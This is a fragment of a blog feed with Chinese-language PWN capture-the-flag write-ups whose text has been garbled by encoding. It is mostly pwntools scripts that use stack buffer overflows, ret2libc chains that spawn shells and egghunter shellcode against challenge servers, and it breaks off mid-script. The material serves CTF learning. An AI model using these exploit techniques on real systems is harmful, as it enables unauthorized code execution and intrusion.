class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./hunting&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;167.99.82.136&#x27;,32646)</span><br><span class=\"line\">payload=&quot;&quot;&quot;</span><br><span class=\"line\">mov edx,0x5fffffff;</span><br><span class=\"line\">xor ecx,ecx;</span><br><span class=\"line\">notaccess:</span><br><span class=\"line\">or dx,0xfff;</span><br><span class=\"line\">inc edx;</span><br><span class=\"line\">mov eax,0x21;</span><br><span class=\"line\">lea  ebx,[edx+4]</span><br><span class=\"line\">int 0x80</span><br><span class=\"line\">cmp eax,0xfffffff2;</span><br><span class=\"line\">jz  notaccess;</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,0x04;</span><br><span class=\"line\">mov ebx,1;</span><br><span class=\"line\">mov ecx,edx;</span><br><span class=\"line\">mov edx,0x26</span><br><span class=\"line\">int 0x80</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">p.sendline(asm(payload))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>æˆåŠŸå¾—åˆ° flag</p>\n<p>å€Ÿé‰´äº†å¤§ä½¬ wp [Huntingâ€” HTB PWN challenge | lexsd6's home](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZXhzZDYuZ2l0aHViLmlvLzIwMjEvMTEvMDIvUFdO\">https://lexsd6.github.io/2021/11/02/PWN</span> Hunting challenge â€” HTB/)</p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/PWN%E5%88%B7%E9%A2%98-md/",
            "url": "https://lookhui.github.io/PWN%E5%88%B7%E9%A2%98-md/",
            "title": "PWNåˆ·é¢˜è§£æ",
            "date_published": "2023-12-13T00:46:10.000Z",
            "content_html": "<h5 id=\"swpuctf-2021-æ–°ç”Ÿèµ›gift_pwn\"><a class=\"anchor\" href=\"#swpuctf-2021-æ–°ç”Ÿèµ›gift_pwn\">#</a> [SWPUCTF 2021 æ–°ç”Ÿèµ›] gift_pwn</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28785)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x4005B6)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2019ååŒ—pwn1\"><a class=\"anchor\" href=\"#ciscn-2019ååŒ—pwn1\">#</a> [CISCN 2019 ååŒ—] PWN1</h5>\n<p>è¿™ä¸ªé¢˜ç›´æ¥è¦†ç›–æ‰ v1 è®©å…¶æº¢å‡ºåç›´æ¥åˆ° return</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28536)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x30+0x8)+p64(0x4006BE)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>å½“ç„¶ä¹Ÿèƒ½è®© v1 æº¢å‡ºä½¿ v2 ç­‰äºé‚£ä¸ªè®©å…¶æ‰§è¡Œ return<br />\ntips:11.28125 è¡¨ç¤ºåœ¨å†…å­˜å­˜å‚¨å°±æ˜¯ 0x41348000</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">xianyufen=remote(&quot;node1.anna.nssctf.cn&quot;,28029)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x2C+p64(0x41348000)</span><br><span class=\"line\">xianyufen.send(payload)</span><br><span class=\"line\">xianyufen.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babystack20\"><a class=\"anchor\" href=\"#bjdctf-2020babystack20\">#</a> [BJDCTF 2020]babystack2.0</h5>\n<p>è¿™ä¸ªé¢˜åˆ¤æ–­ç‚¹åœ¨äºæ— ç¬¦å·ç±»å‹å› ä¸ºé‡Œé¢çš„<br />\n <code>if ( (int)nbytes &gt; 10 ) </code> read(0, buf, (unsigned int)nbytes);<br />\n å› ä¸º buf çš„æº¢å‡ºè¦ 0x18 ä½†æ˜¯ nbytes åªèƒ½æ˜¯ &lt; 10 æ‰€ä»¥æˆ‘ä»¬å°±è¦ä½¿ç”¨æ— ç¬¦å·ç±»å‹è®©å®ƒç­‰äº - 1 ç„¶åå°±èƒ½è¯»å–å¾ˆå¤šäº§ç”Ÿæº¢å‡º</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28867)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x400726)</span><br><span class=\"line\">p.sendlineafter(&#x27;name:&#x27;,&#x27;-1&#x27;)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022reorpwn\"><a class=\"anchor\" href=\"#nisactf-2022reorpwn\">#</a> [NISACTF 2022]ReorPwn?</h5>\n<p>è¿™ä¸ªé¢˜æ³¨æ„ä»–çš„ fun å‡½æ•°é‡Œé¢ç»™ä½ çš„é¡ºåºé€†äº†ä¸€ä¸‹ï¼Œä¸‹é¢å°±æ˜¯ systemï¼Œé‚£ç›´æ¥ä½¿ç”¨ payload æ•°ç»„é€†ä½ä¸€ä¸‹</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28301)</span><br><span class=\"line\">comm=&#x27;cat /flag&#x27;</span><br><span class=\"line\">a=comm[::-1]</span><br><span class=\"line\">p.sendlineafter(&#x27;lleT:&#x27;,a)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babystack\"><a class=\"anchor\" href=\"#bjdctf-2020babystack\">#</a> [BJDCTF 2020]babystack</h5>\n<p>è¿™ä¸ªé¢˜å°±æ›´ç®€å•äº†ï¼Œåƒå‰é¢é‚£ä¸ªé¢˜ï¼Œè¿™ä¸ªé¢˜è¿˜ä¸éœ€è¦åˆ¤æ–­ read çš„é•¿åº¦éšä¾¿è¾“å°±è¡Œèƒ½è¾¾åˆ°æº¢å‡ºç‚¹å°±è¡Œ</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28240)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x4006E6)</span><br><span class=\"line\">p.sendlineafter(&#x27;name:&#x27;,&#x27;-1&#x27;)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022ezstack\"><a class=\"anchor\" href=\"#nisactf-2022ezstack\">#</a> [NISACTF 2022]ezstack</h5>\n<p>æ‰“å¼€åç”¨ ida æŸ¥çœ‹åˆ°ä»£ç é‡Œé¢æ²¡æœ‰ system ('/bin/sh') ä½†æ˜¯æœ‰ system å¹¶ä¸”åœ¨ data æ®µé‡Œé¢æœ‰ /bin/sh é‚£æˆ‘ä»¬ç›´æ¥è®©ä»£ç æº¢å‡ºè°ƒç”¨ system å’Œ /bin/sh</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28961)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x48+0x4)+p32(0x08048512)+p32(0x804A024)</span><br><span class=\"line\">p.sendlineafter(&#x27;NISACTF&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"watevrctf-2019voting-machine-1\"><a class=\"anchor\" href=\"#watevrctf-2019voting-machine-1\">#</a> [watevrCTF 2019]Voting Machine 1</h5>\n<p>è¿™ä¸ªé¢˜æœ‰ä¸¤ä¸ªè§£æ³•ï¼Œè¾“å…¥ 0x2 æˆ–è€… 0xa</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>machine</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28788)</span><br><span class=\"line\">#p=process(&#x27;./ctf&#x27;)</span><br><span class=\"line\">#gdb.attach(p)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0xa)+p64(0x400807)</span><br><span class=\"line\">p.sendlineafter(&quot;Vote:&quot;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022ezpie\"><a class=\"anchor\" href=\"#nisactf-2022ezpie\">#</a> [NISACTF 2022]ezpie</h5>\n<p>è¿™ç§é¢˜è¦æ³¨æ„æµç¨‹åŒ–ï¼Œå…ˆçœ‹å› ä¸ºå¼€å¯äº† pie åœ°å€éšæœºåŒ–å°±å¾—å»ç®—ä»–ä»¬çš„åç§»é‡å› ä¸ºå¾—åˆ°äº† main å‡½æ•°åœ°å€æ‰€ä»¥å°±ç›´æ¥æ„é€ </p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28694)</span><br><span class=\"line\">elf=ELF(&#x27;./pw&#x27;)</span><br><span class=\"line\">shell=elf.sym[&#x27;shell&#x27;]</span><br><span class=\"line\">main=elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\">offset=shell-main</span><br><span class=\"line\">log.info(&#x27;offset is :%x&#x27;%offset)</span><br><span class=\"line\">p.recvuntil(&#x27;gift!\\n&#x27;)</span><br><span class=\"line\">main_addr=int(p.recv(10).decode(),16)</span><br><span class=\"line\">p_shell_addr=main_addr+offset</span><br><span class=\"line\">log.info(&#x27;main_addr is %x&#x27;%main_addr)</span><br><span class=\"line\">log.info(&#x27;shelloffset is %x&#x27;%p_shell_addr)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x28+0x4)+p32(p_shell_addr)</span><br><span class=\"line\">p.sendlineafter(&#x27;Input:&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"2021-é¹¤åŸæ¯babyof\"><a class=\"anchor\" href=\"#2021-é¹¤åŸæ¯babyof\">#</a> [2021 é¹¤åŸæ¯] babyof</h5>\n<p>è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ª ret2libc çš„é¢˜é¦–å…ˆè¦æ³„éœ²å‡ºä¸€ä¸ª libc åŸºåœ°å€ç„¶åæ‰èƒ½å¾—åˆ°å…¶ä»–çš„åœ°å€</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context.log_level = &quot;debug&quot;</span><br><span class=\"line\">program = &quot;./babyof&quot;</span><br><span class=\"line\">p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28666)#process(program)</span><br><span class=\"line\">elf = ELF(program)</span><br><span class=\"line\">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class=\"line\">puts_got = elf.got[&quot;puts&quot;]</span><br><span class=\"line\">pop_rdi = 0x400743</span><br><span class=\"line\">pop_ret = 0x400506</span><br><span class=\"line\">__start = 0x400550</span><br><span class=\"line\">payload = b&#x27;a&#x27;*(0x40+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) #//è·³è½¬åˆ°rdiå¯„å­˜å™¨ä¸Šé¢ç„¶ååœ¨é€šè¿‡putså‡½æ•°æ¥æ‰“å°putsçš„gotåœ¨é€šè¿‡retåˆ°èµ·å§‹ä½ç½®è®©ä¸‹é¢çš„payloadç”Ÿæ•ˆ</span><br><span class=\"line\">p.sendlineafter(&quot;Do you know how to do buffer overflow?\\n&quot;,payload)</span><br><span class=\"line\">p.recvuntil(&quot;I hope you win\\n&quot;)</span><br><span class=\"line\">puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))  #\\\\æ¥æ”¶putsçš„gotåœ°å€å› ä¸ºæ ˆåœ°å€ä¸€èˆ¬æ˜¯ç”±\\x7få¼€å¤´çš„è‡ªåŠ¨è¡¥å…¨8ä½</span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr) #\\\\åˆ©ç”¨puts_addråœ¨LibcSearcheré‡Œé¢æŸ¥æ‰¾å¯¹æ˜ çš„åº“</span><br><span class=\"line\">libc_addr = puts_addr-libc.dump(&#x27;puts&#x27;)  #\\\\åˆ©ç”¨puts_addrï¼ˆåŠ¨æ€åœ°å€ï¼‰å‡å»putsçš„å‡½æ•°åç§»é‡å³å¯å¾—åˆ°libcçš„åŸºåœ°å€</span><br><span class=\"line\">bin_sh_str=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;) #\\\\ä¸‹é¢çš„å¾—åˆ°åŸºåœ°å€åéƒ½åŠ ä¸Šåç§»é‡å°±èƒ½å¾—åˆ°å¯¹åº”çš„å‡½æ•°äº†</span><br><span class=\"line\">system=libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\">log.info(&#x27;libc addr is %x&#x27;%libc_addr)</span><br><span class=\"line\">log.info(&#x27;bin_sh_str is %x&#x27;%bin_sh_str)</span><br><span class=\"line\">payload2 = b&#x27;a&#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)+p64(__start) #\\\\ä½¿ç”¨ä¸€ä¸ªretæ¥è·³è½¬åˆ°pop_rdiç„¶åå°±åˆ©ç”¨system(/bin/sh)å³å¯</span><br><span class=\"line\">p.sendlineafter(&quot;Do you know how to do buffer overflow?\\n&quot;,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gfctf-2021where_is_shell\"><a class=\"anchor\" href=\"#gfctf-2021where_is_shell\">#</a> [GFCTF 2021]where_is_shell</h5>\n<p>å¯ä»¥åˆ©ç”¨ system ($0) è·å¾— shell æƒé™ï¼Œ$0 åœ¨æœºå™¨ç ä¸­ä¸º \\x24\\x30</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">elf = ELF(&#x27;./shell&#x27;)</span><br><span class=\"line\">local = 1</span><br><span class=\"line\">if local ==0:</span><br><span class=\"line\"> p = process(&#x27;./shell&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\"> p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28616)</span><br><span class=\"line\">ret_addr = 0x400416 # ROPgadget --binary shell --only &#x27;ret&#x27;</span><br><span class=\"line\">pop_rdi_ret = 0x4005e3 # ROPgadget --binary shell --only &#x27;pop|rdi|ret&#x27;</span><br><span class=\"line\">tips = 0x400541</span><br><span class=\"line\">system_addr = elf.symbols[&#x27;system&#x27;]</span><br><span class=\"line\">payload = b&#x27;b&#x27;*0x10+b&#x27;b&#x27;*8+p64(ret_addr)+p64(pop_rdi_ret)+p64(tips)+p64(system_addr)</span><br><span class=\"line\">p.sendlineafter(&#x27;find it?\\n&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2021-æ–°ç”Ÿèµ›whitegive_pwn\"><a class=\"anchor\" href=\"#swpuctf-2021-æ–°ç”Ÿèµ›whitegive_pwn\">#</a> [SWPUCTF 2021 æ–°ç”Ÿèµ›] whitegive_pwn</h5>\n<p>è¿™ä¸ªé¢˜çš„è¯å’Œ babyof çš„é¢˜å·®ä¸å¤šå°±æ˜¯ä¸€ä¸ª ret2libc çš„é¢˜ä½†æ˜¯è¿™ä¸ªé¢˜çš„ libc.so æœ‰é—®é¢˜æ‰“ä¸è¿›å»ä»£ç å¦‚ä¸‹</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context.log_level = &quot;debug&quot;</span><br><span class=\"line\">program = &quot;./Desktop/é™„ä»¶&quot;</span><br><span class=\"line\">p = remote(&#x27;node5.anna.nssctf.cn&#x27;,28406)#process(program)</span><br><span class=\"line\">elf = ELF(program)</span><br><span class=\"line\">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class=\"line\">puts_got = elf.got[&quot;puts&quot;]</span><br><span class=\"line\">pop_rdi = 0x400763</span><br><span class=\"line\">pop_ret = 0x400509</span><br><span class=\"line\">__start = 0x400570</span><br><span class=\"line\">payload = b&#x27;a&#x27;*(0x10+0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) </span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))  #\\\\æ¥æ”¶putsçš„gotåœ°å€å› ä¸ºæ ˆåœ°å€ä¸€èˆ¬æ˜¯ç”±\\x7få¼€å¤´çš„è‡ªåŠ¨è¡¥å…¨8ä½</span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr) #\\\\åˆ©ç”¨puts_addråœ¨LibcSearcheré‡Œé¢æŸ¥æ‰¾å¯¹æ˜ çš„åº“</span><br><span class=\"line\">libc_addr = puts_addr-libc.dump(&#x27;puts&#x27;)  #\\\\åˆ©ç”¨puts_addrï¼ˆåŠ¨æ€åœ°å€ï¼‰å‡å»putsçš„å‡½æ•°åç§»é‡å³å¯å¾—åˆ°libcçš„åŸºåœ°å€</span><br><span class=\"line\">bin_sh_str=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;) #\\\\ä¸‹é¢çš„å¾—åˆ°åŸºåœ°å€åéƒ½åŠ ä¸Šåç§»é‡å°±èƒ½å¾—åˆ°å¯¹åº”çš„å‡½æ•°äº†</span><br><span class=\"line\">system=libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\">log.info(&#x27;libc addr is %x&#x27;%libc_addr)</span><br><span class=\"line\">log.info(&#x27;bin_sh_str is %x&#x27;%bin_sh_str)</span><br><span class=\"line\">payload2 = b&#x27;a&#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)+p64(__start) #\\\\ä½¿ç”¨ä¸€ä¸ªretæ¥è·³è½¬åˆ°pop_rdiç„¶åå°±åˆ©ç”¨system(/bin/sh)å³å¯</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>è¿˜æœ‰ä¸ªå¤§ä½¬ç”¨çš„è£¸ so æ‰“è¿›å»çš„</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#p = process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">p = remote(&#x27;node5.anna.nssctf.cn&#x27;,28820)</span><br><span class=\"line\">elf = ELF(&#x27;./pw&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def debug():</span><br><span class=\"line\">    gdb.attach(p)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\">def get_addr():</span><br><span class=\"line\">\treturn u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">rdi = 0x400763</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x18 + p64(rdi) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;vuln&#x27;])</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = get_addr() - 0x06f6a0</span><br><span class=\"line\">system = libc_base + 0x0453a0</span><br><span class=\"line\">binsh = libc_base + 0x18ce57</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x18 + p64(rdi) + p64(binsh) + p64(system) </span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2019ä¸œåŒ—pwn2\"><a class=\"anchor\" href=\"#ciscn-2019ä¸œåŒ—pwn2\">#</a> [CISCN 2019 ä¸œåŒ—] PWN2</h5>\n<p>è¿™åˆæ˜¯ä¸ª ret2libc çš„ä½“å‹ç›´æ¥æ‰“</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&quot;./pwn2&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28652)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">start=0x400790</span><br><span class=\"line\"></span><br><span 